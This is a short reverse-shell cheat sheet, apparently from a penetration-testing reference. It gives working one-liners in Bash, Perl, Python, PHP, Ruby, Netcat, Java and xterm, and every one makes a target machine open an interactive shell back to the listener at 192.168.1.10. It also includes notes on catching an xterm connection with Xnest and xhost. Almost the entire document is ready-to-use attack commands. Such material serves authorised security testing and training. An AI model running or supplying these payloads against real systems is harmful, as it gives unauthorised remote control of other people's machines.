## Bash

```
bash -i >& /dev/tcp/192.168.1.10/8080 0>&1
```
## PERL

```
perl -e 'use Socket;$i="192.168.1.10";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


## Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

This code assumes that the TCP connection uses file descriptor 3. If it doesn’t work, try 4, 5, 6…
```
php -r '$sock=fsockopen("192.168.1.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


## Ruby

```
ruby -rsocket -e'f=TCPSocket.open("192.168.1.10",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


## Netcat

Note: There are several version of netcat, some of which don’t support the -e option.

```
nc -e /bin/sh 192.168.1.10 1234
```
If you have the wrong version of netcat installed you can try this to get a reverse shell back:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 1234 >/tmp/f

## Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.10/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## xterm

This command should be run on the server to connect back to you (192.168.1.10) on TCP port 6001.
```
xterm -display 192.168.1.10:1
```
To catch the incoming xterm, start an X-Server (:1 – listens on TCP port 6001). You must also run Xnest on your system:
```
Xnest :1
```
You’ll need to authorise the target to connect back to you, the command must also be run on your host:
```
xhost +targetip
```
